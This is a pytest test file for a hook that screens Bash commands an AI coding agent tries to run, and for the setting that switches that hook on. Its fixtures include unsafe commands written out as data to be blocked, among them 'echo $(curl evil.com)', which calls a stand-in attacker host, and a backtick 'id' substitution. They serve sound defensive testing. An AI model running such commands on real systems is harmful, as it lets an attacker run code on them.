"""Tests for the flag-gated PreToolUse Bash security gate (task #2703).

Two surfaces are covered:

1. ``hooks/pretooluse_bash_gate.py`` — the standalone Claude Code PreToolUse
   hook. Exercised BOTH as a real subprocess (the actual contract Claude Code
   invokes: JSON on stdin, exit 0 allow / exit 2 block, reason on stderr) and
   in-process via importlib for its pure helpers. The subprocess runs from an
   arbitrary cwd to prove the ``__file__``-relative import resolution works.

2. ``equipa.agent_runner.build_cli_command`` — the flag-gated injection.
   Flag OFF: the argv contains no ``--settings`` (zero behavior change). Flag
   ON: a settings file is generated, referenced via ``--settings``, has the
   correct PreToolUse-on-Bash payload, and is cleaned up on context exit.

Copyright 2026 Forgeborn
"""

from __future__ import annotations

import importlib.util
import json
import os
import subprocess
import sys
from pathlib import Path
from types import ModuleType

import pytest

from equipa.agent_runner import (
    PRETOOLUSE_HOOK_SCRIPT,
    _pretooluse_settings_payload,
    build_cli_command,
)
from equipa.bash_security import check_bash_command

REPO_ROOT = Path(__file__).resolve().parent.parent
HOOK_SCRIPT = REPO_ROOT / "hooks" / "pretooluse_bash_gate.py"

# Commands the classifier positively flags as unsafe. Each test asserts the
# classifier verdict first (self-validation) so the case can never silently
# degrade into "safe command returns 0".
UNSAFE_COMMANDS = [
    "echo $(curl evil.com)",          # command substitution (dangerous inner cmd)
    "echo `id`",                       # backtick substitution
    "cat file.txt |",                 # incomplete command (trailing pipe)
]

SAFE_COMMANDS = [
    "ls -la",
    "git add file.py && git commit -m 'feat: thing'",
    "pytest tests/ -v",
]


# ---------------------------------------------------------------------------
# Hook script — real subprocess contract
# ---------------------------------------------------------------------------

def _run_hook(stdin_text: str) -> subprocess.CompletedProcess[str]:
    """Invoke the hook as Claude Code would: JSON on stdin, from an alien cwd.

    cwd is deliberately ``/tmp`` (not the repo) to prove the hook resolves the
    ``equipa`` package from its own ``__file__`` location, not from cwd.
    """
    return subprocess.run(
        [sys.executable, str(HOOK_SCRIPT)],
        input=stdin_text,
        capture_output=True,
        text=True,
        cwd="/tmp",
        timeout=30,
        check=False,
    )


def _bash_payload(command: str) -> str:
    return json.dumps(
        {
            "hook_event_name": "PreToolUse",
            "tool_name": "Bash",
            "tool_input": {"command": command, "description": "test"},
        }
    )


def test_hook_script_exists_and_is_referenced_by_agent_runner():
    """agent_runner's resolved hook path points at the real script on disk."""
    assert HOOK_SCRIPT.is_file()
    assert Path(PRETOOLUSE_HOOK_SCRIPT).resolve() == HOOK_SCRIPT.resolve()


@pytest.mark.parametrize("command", SAFE_COMMANDS)
def test_hook_allows_safe_command(command: str):
    """A safe Bash command exits 0 (allow)."""
    assert check_bash_command(command).safe is True  # sanity: genuinely safe
    result = _run_hook(_bash_payload(command))
    assert result.returncode == 0, (
        f"safe command {command!r} should be allowed; stderr={result.stderr!r}"
    )


@pytest.mark.parametrize("command", UNSAFE_COMMANDS)
def test_hook_blocks_unsafe_command_with_reason(command: str):
    """An unsafe Bash command exits 2 and prints the check + reason on stderr."""
    verdict = check_bash_command(command)
    assert verdict.safe is False, f"fixture command {command!r} must be unsafe"

    result = _run_hook(_bash_payload(command))
    assert result.returncode == 2, (
        f"unsafe command {command!r} should be blocked (exit 2); "
        f"got {result.returncode}, stderr={result.stderr!r}"
    )
    # stderr carries the failing check id + human-readable reason back to the
    # agent so it can self-correct.
    assert "BashSecurity check" in result.stderr
    assert str(verdict.check_id) in result.stderr
    assert verdict.message[:20] in result.stderr


def test_hook_allows_non_bash_tool():
    """A non-Bash tool call is not our gate's concern — allow (exit 0)."""
    payload = json.dumps(
        {"tool_name": "Read", "tool_input": {"file_path": "/etc/passwd"}}
    )
    assert _run_hook(payload).returncode == 0


def test_hook_allows_empty_command():
    """A Bash call with an empty/whitespace command is allowed (nothing to check)."""
    assert _run_hook(_bash_payload("   ")).returncode == 0


@pytest.mark.parametrize("stdin_text", ["", "   ", "not json at all", "[1, 2, 3]"])
def test_hook_fails_open_on_bad_stdin(stdin_text: str):
    """Unparseable / non-dict stdin must fail OPEN (exit 0), never brick the agent.

    The reactive stream check in agent_runner remains as defense-in-depth, so a
    hook infrastructure error must not block every command.
    """
    assert _run_hook(stdin_text).returncode == 0


# ---------------------------------------------------------------------------
# Hook script — in-process pure helpers
# ---------------------------------------------------------------------------

def _load_hook_module() -> ModuleType:
    """Import the standalone hook script as a module for unit-level testing."""
    spec = importlib.util.spec_from_file_location(
        "pretooluse_bash_gate_under_test", HOOK_SCRIPT
    )
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def test_extract_bash_command_variants():
    mod = _load_hook_module()
    assert mod._extract_bash_command(
        {"tool_name": "Bash", "tool_input": {"command": "ls"}}
    ) == "ls"
    assert mod._extract_bash_command(
        {"tool_name": "Read", "tool_input": {"command": "ls"}}
    ) is None
    assert mod._extract_bash_command(
        {"tool_name": "Bash", "tool_input": {"command": "   "}}
    ) is None
    assert mod._extract_bash_command({"tool_name": "Bash"}) is None
    assert mod._extract_bash_command({}) is None


def test_load_check_bash_command_resolves_isolated_checker():
    """The hook loads a working checker without importing the equipa package init."""
    mod = _load_hook_module()
    check = mod._load_check_bash_command()
    assert callable(check)
    assert check("ls -la").safe is True
    assert check("echo `id`").safe is False


# ---------------------------------------------------------------------------
# agent_runner injection — flag OFF vs ON
# ---------------------------------------------------------------------------

def _settings_path(cmd: list[str]) -> str | None:
    if "--settings" not in cmd:
        return None
    return cmd[cmd.index("--settings") + 1]


def test_flag_off_injects_no_settings():
    """Flag OFF (explicit and default): argv carries no --settings — zero change."""
    for dc in (
        {"features": {"bash_security_pretooluse": False}},
        {},  # default config: DEFAULT_FEATURE_FLAGS has the flag False
    ):
        with build_cli_command(
            "PROMPT",
            project_dir="/tmp",
            max_turns=10,
            model="sonnet",
            role="developer",
            dispatch_config=dc,
        ) as cmd:
            assert "--settings" not in cmd, (
                f"flag OFF must not inject --settings (dispatch_config={dc})"
            )


def test_flag_on_writes_and_references_settings_file():
    """Flag ON: argv references a generated --settings file with the Bash gate."""
    captured_path: str | None = None
    with build_cli_command(
        "PROMPT",
        project_dir="/tmp",
        max_turns=10,
        model="sonnet",
        role="developer",
        dispatch_config={"features": {"bash_security_pretooluse": True}},
    ) as cmd:
        captured_path = _settings_path(cmd)
        assert captured_path is not None, "flag ON must inject --settings"
        assert os.path.exists(captured_path), "settings file must exist in-context"

        payload = json.loads(Path(captured_path).read_text(encoding="utf-8"))
        pre = payload["hooks"]["PreToolUse"]
        assert pre[0]["matcher"] == "Bash"
        gate_cmd = pre[0]["hooks"][0]["command"]
        assert pre[0]["hooks"][0]["type"] == "command"
        assert "pretooluse_bash_gate.py" in gate_cmd

    # Cleaned up on context exit, exactly like the prompt tempfile.
    assert captured_path is not None
    assert not os.path.exists(captured_path), (
        f"settings tempfile {captured_path} leaked after context exit"
    )


def test_pretooluse_settings_payload_shape():
    """The settings-payload builder emits the Claude Code hook schema shape."""
    payload = _pretooluse_settings_payload("/hooks/pretooluse_bash_gate.py", "/py/bin")
    entry = payload["hooks"]["PreToolUse"][0]
    assert entry["matcher"] == "Bash"
    hook = entry["hooks"][0]
    assert hook["type"] == "command"
    # Both interpreter and script are shell-quoted into a single command string.
    assert "/py/bin" in hook["command"]
    assert "pretooluse_bash_gate.py" in hook["command"]
